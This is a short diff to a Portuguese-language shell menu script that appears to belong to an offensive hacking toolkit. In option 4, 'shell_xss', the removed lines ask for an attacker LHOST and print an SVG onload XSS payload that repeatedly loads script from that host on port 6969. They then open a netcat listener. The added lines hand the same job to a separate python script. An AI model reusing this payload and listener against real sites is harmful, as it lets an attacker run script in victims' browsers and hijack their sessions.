@@ -52,12 +52,9 @@ case "$opcao" in
 	;;
 
 	4)
-		figlet shell_xss
-		read -p "seu LHOST: " ipxss
-		echo "cole isso no local vuneravel:"
-		echo "<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//$ipxss:6969"},100);>"
-		echo "aguardando conexão..."
-		nc -lp 6969
+		cd requisitos
+		python3 shellxss.py
+		cd ..
 	;;
 
 	5)
